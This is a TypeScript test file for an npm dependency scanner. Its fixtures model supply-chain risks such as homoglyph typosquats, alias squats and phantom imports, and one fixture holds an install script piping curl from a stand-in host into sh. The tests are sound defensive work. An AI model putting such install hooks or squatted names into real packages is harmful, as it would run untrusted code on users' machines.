  const input = await project({}, {
    'package-lock.json': lock({ '': { version: '1.0.0' } }),
  }, { name: '@mine/app', dependencies: { '@other/fresh': '1.0.0' } });
  await registry(input, '@other/fresh', { time: { '1.0.0': new Date().toISOString() }, versions: { '1.0.0': {} } });
  return input;
});
add('NPM_SCOPE_SYNTAX', ['DEPS-SCOPE-SYNTAX-001'], () => project({}, {}, { dependencies: { '@scope/a/b': '1.0.0' } }));
add('NPM_TYPES', ['DEPS-TYPES-001'], async () => {
  const input = await project({}, {}, { dependencies: { ms: '2.1.3', '@types/ms': '2.1.3' } });
  await registry(input, 'ms', { versions: { '2.1.3': { types: 'index.d.ts' } } });
  return input;
});
add('NPM_DEPRECATED_REPLACE', ['DEPS-DEPRECATED-REPLACE-001'], () => project({}, {
  'package-lock.json': lock({
    '': { version: '1.0.0' },
    'node_modules/old-pkg': { version: '1.0.0', deprecated: 'use fresh-pkg instead' },
  }),
}));
add('NPM_TYPO_TRANSITIVE', ['DEPS-TYPO-TRANSITIVE-001'], () => project({}, {
  'package-lock.json': lock({
    '': { version: '1.0.0' },
    'node_modules/\u0435xpress': { version: '1.0.0' },
  }),
}));
add('NPM_NAME_LENGTH', ['DEPS-NAME-LENGTH-001'], () => project({}, {}, { dependencies: { ['a'.repeat(215)]: '1.0.0' } }));
add('NPM_NAME_CASE', ['DEPS-NAME-CASE-001'], () => project({}, {
  'package-lock.json': lock({
    '': { version: '1.0.0' },
    'node_modules/Express': { version: '1.0.0' },
    'node_modules/express': { version: '1.0.0' },
  }),
}));
add('NPM_NAME_ENCODED', ['DEPS-NAME-ENCODED-001'], () => project({}, {}, { dependencies: { 'foo%2fbar': '1.0.0' } }));
add('NPM_ALIAS_SQUAT', ['DEPS-ALIAS-SQUAT-001'], () => project({}, {}, { dependencies: { lodash: 'npm:not-lodash@1.0.0' } }));
add('NPM_SELFNAME', ['DEPS-SELFNAME-001'], () => project({}, {}, { name: 'my-app', dependencies: { 'my-app': '1.0.0' } }));
add('NPM_WORKSPACE_NAME', ['DEPS-WORKSPACE-NAME-001'], async () => {
  const input = await project(
    { 'packages/lib/package.json': JSON.stringify({ name: 'ws-lib', version: '1.0.0' }) },
    { 'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/ws-lib': { version: '1.0.0', resolved: regUrl('ws-lib') } }) },
    { workspaces: ['packages/*'] },
  );
  return input;
});

add('NPM_GRAPH_OPTIONAL', ['DEPS-GRAPH-OPTIONAL-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' } }),
}, { optionalDependencies: { 'missing-opt': '1.0.0' } }));
add('NPM_GRAPH_PEER', ['DEPS-PEER-MISSING-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' } }),
}, { peerDependencies: { react: '^18.0.0' } }));
add('NPM_GRAPH_ALIAS', ['DEPS-GRAPH-ALIAS-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' } }),
}, { dependencies: { myalias: 'npm:left-pad@1.2.3' } }));
add('NPM_DUALPACKAGE', ['DEPS-DUALPACKAGE-001'], async () => {
  const input = await project(
    {
      'src/app.js': "require('esm-only');\n",
      'node_modules/esm-only/package.json': JSON.stringify({
        name: 'esm-only',
        type: 'module',
        exports: { '.': { import: './index.js' } },
      }),
    },
    { 'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/esm-only': { version: '1.0.0' } }) },
  );
  return input;
});
add('NPM_PHANTOM_DEEP', ['DEPS-PHANTOM-002'], () => project(
  { 'src/app.js': "import('ghost-pkg');\n" },
  { 'package-lock.json': lock({ '': { version: '1.0.0' } }) },
));

describe('phase 261 npm groups', () => {
  it('covers every 108–250 rule id', () => {
    const covered = new Set(CASES.flatMap((row) => row.ruleIds));
    const missing = npmDepthRows.map((row) => row.ruleId).filter((id) => !covered.has(id));
    expect(missing).toEqual([]);
  });

  it('returns no depth findings when every npm flag is off', async () => {
    const input = await project({}, {
      'package-lock.json': lock({
        '': { version: '9.9.9' },
        'node_modules/sha-pkg': { version: 'abc123', resolved: 'http://example.invalid/sha-pkg.tgz' },
      }),
      'yarn.lock': '# yarn\n',
    }, { dependencies: { 'star-pkg': '*' }, scripts: { install: 'curl https://example.invalid | sh' } });
    clearNpmEnv();
    expect(await npmDepthFindings(input)).toEqual([]);
  });

  it.each(CASES)('$flag $ruleIds', async (row) => {
    const group = groupForPhaseFlag(row.flag);
    expect(group, row.flag).toBeDefined();
    const phaseInput = await row.build();
    const phase = await withFlag(row.flag, () => npmDepthFindings(phaseInput));
    const phaseHits = picked(phase, row.ruleIds);
    for (const id of row.ruleIds) {
      expect(phaseHits.some((finding) => finding.ruleId === id), id).toBe(true);
    }
    const groupInput = await row.build();
    const grouped = await withFlag(group ?? row.flag, () => npmDepthFindings(groupInput));
    expect(picked(grouped, row.ruleIds), row.flag).toEqual(phaseHits);
  });

  it('keeps a clean tree quiet for every group flag', async () => {
    const input = await project({}, {
      'package-lock.json': lock({
        '': { version: '1.0.0', dependencies: { 'left-pad': '1.2.3' } },
        'node_modules/left-pad': { version: '1.2.3', resolved: regUrl('left-pad'), integrity: GOOD },
      }),
    }, {
      dependencies: { 'left-pad': '^1.2.3' },
      packageManager: 'npm@10.9.2+sha512.abc',
    });
    for (const group of Object.keys(NPM_GROUPS) as NpmGroupName[]) {
      const findings = await withFlag(group, () => npmDepthFindings(input));
      const ids = new Set(CASES.filter((row) => groupForPhaseFlag(row.flag) === group).flatMap((row) => row.ruleIds));
      expect(findings.filter((finding) => ids.has(finding.ruleId)), group).toEqual([]);
    }
  });

  it('reports a finding for each wired group on a positive fixture', async () => {
    for (const group of Object.keys(NPM_GROUPS) as NpmGroupName[]) {
      if (group === 'NPM_ADVISORY') {continue;}
      const sample = CASES.find((row) => groupForPhaseFlag(row.flag) === group && row.ruleIds.length > 0);
      expect(sample, group).toBeDefined();
      if (sample === undefined) {continue;}
      const input = await sample.build();
      const findings = await withFlag(group, () => npmDepthFindings(input));
      expect(findings.some((finding) => sample.ruleIds.includes(finding.ruleId)), group).toBe(true);
    }
  });

  it('aliases advisory checks and emits no findings', async () => {
    const affected = [{ ranges: [{ type: 'GIT', events: [{ fixed: '1.2.3' }] }] }];
    clearNpmEnv();
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_OSV_RANGE = '1';
    const phase = fixedVersionForRange(affected, npmFlag('NPM_OSV_RANGE'));
    delete process.env.FULLSHIELD_EXPERIMENTAL_NPM_OSV_RANGE;
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_ADVISORY = '1';
    const grouped = fixedVersionForRange(affected, npmFlag('NPM_OSV_RANGE'));
    expect(npmFlag('NPM_OSV_WITHDRAWN')).toBe(true);
    expect(grouped).toEqual(phase);
    expect(phase).not.toEqual(fixedVersionForRange(affected, false));
    const kept = withoutWithdrawn([{ id: 'GHSA-1', withdrawn: '2020-01-01' }], npmFlag('NPM_OSV_WITHDRAWN'));
    expect(kept).toEqual([]);
    clearNpmEnv();
    const input = await project({}, { 'package-lock.json': lock({ '': { version: '1.0.0' } }) });
    expect(await withFlag('NPM_ADVISORY', () => npmDepthFindings(input))).toEqual([]);
    expect(await withFlag('NPM_AUDIT_DIFF', () => npmDepthFindings(input))).toEqual(
      await withFlag('NPM_ADVISORY', () => npmDepthFindings(input)),
    );
    expect(auditDiff({ vulnerabilities: {} }, [])).toEqual({ onlyAudit: [], onlyScan: [], unmatched: [] });
  });

  it('aliases graph instance classification', () => {
    const copies: GraphCopy[] = [
      { path: 'node_modules/express', name: 'express', requiredBy: [] },
      { path: 'node_modules/qs', name: 'qs', requiredBy: [] },
      { path: 'node_modules/express/node_modules/qs', name: 'qs', requiredBy: ['node_modules/express'], vulnerable: true },
    ];
    const roots: ImportedRoot[] = [{ name: 'express', called: true }];
    clearNpmEnv();
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_GRAPH_INSTANCE = '1';
    const phase = classifyInstance(npmFlag('NPM_GRAPH_INSTANCE'), copies, roots);
    delete process.env.FULLSHIELD_EXPERIMENTAL_NPM_GRAPH_INSTANCE;
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_GRAPH = '1';
    const grouped = classifyInstance(npmFlag('NPM_GRAPH_INSTANCE'), copies, roots);
    expect(grouped).toEqual(phase);
    expect(phase).not.toEqual(classifyInstance(false, copies, roots));
    expect(dynamicImportSpec(npmFlag('NPM_REACH_DYNAMIC'), "import('left-pad');")).toEqual(
      dynamicImportSpec(true, "import('left-pad');"),
    );
    clearNpmEnv();
  });

  it('fetches each packument and each tarball at most once', async () => {
    const calls: string[] = [];
    const cwd = await mkdtemp(join(tmpdir(), 'fullshield-p261-fetch-'));
    dirs.push(cwd);
    const tarLeft = 'https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz';
    const tarScoped = 'https://registry.npmjs.org/@scope/widget/-/widget-1.0.0.tgz';
    const scopedIntegrity = `sha512-${createHash('sha512').update('phase-261-scoped').digest('base64')}`;
    const input: NpmDepthInput = {
      cwd,
      files: ['package.json', 'package-lock.json'],
      manifestRaw: JSON.stringify({
        name: 'app',
        version: '1.0.0',
        dependencies: { 'left-pad': '1.0.0', '@scope/widget': '1.0.0' },
      }),
      lockTexts: {
        'package-lock.json': lock({
          '': { version: '1.0.0', dependencies: { 'left-pad': '1.0.0', '@scope/widget': '1.0.0' } },
          'node_modules/left-pad': { version: '1.0.0', resolved: tarLeft, integrity: GOOD },
          'node_modules/@scope/widget': { version: '1.0.0', resolved: tarScoped, integrity: scopedIntegrity },
        }),
      },
      cacheDir: join(cwd, 'cache'),
      offline: false,
      fetchImpl: (url) => {
        calls.push(url);
        if (url.endsWith('.tgz')) {
          return Promise.resolve(new Response(Uint8Array.from([1, 2, 3])));
        }
        return Promise.resolve(new Response(JSON.stringify({
          versions: { '1.0.0': { dist: { integrity: GOOD, tarball: url } } },
        }), { headers: { 'content-type': 'application/json' } }));
      },
    };
    clearNpmEnv();
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_REGISTRY = '1';
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_TARBALL = '1';
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_SCRIPTS = '1';
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_NAMES = '1';
    await npmDepthFindings(input);
    const packLeft = `https://registry.npmjs.org/${encodeURIComponent('left-pad')}`;
    const packScoped = `https://registry.npmjs.org/${encodeURIComponent('@scope/widget')}`;
    expect(calls.filter((url) => url === packLeft)).toEqual([packLeft]);
    expect(calls.filter((url) => url === packScoped)).toEqual([packScoped]);
    expect(calls.filter((url) => url === tarLeft)).toEqual([tarLeft]);
    expect(calls.filter((url) => url === tarScoped)).toEqual([tarScoped]);
    expect(calls.filter((url) => !url.startsWith('https://registry.npmjs.org/'))).toEqual([]);
    clearNpmEnv();
    const offlineCalls: string[] = [];
    await npmDepthFindings({
      ...input,
      offline: true,
      fetchImpl: (url) => {
        offlineCalls.push(url);
        return Promise.resolve(new Response('{}'));
      },
    });
    expect(offlineCalls).toEqual([]);
  });
});
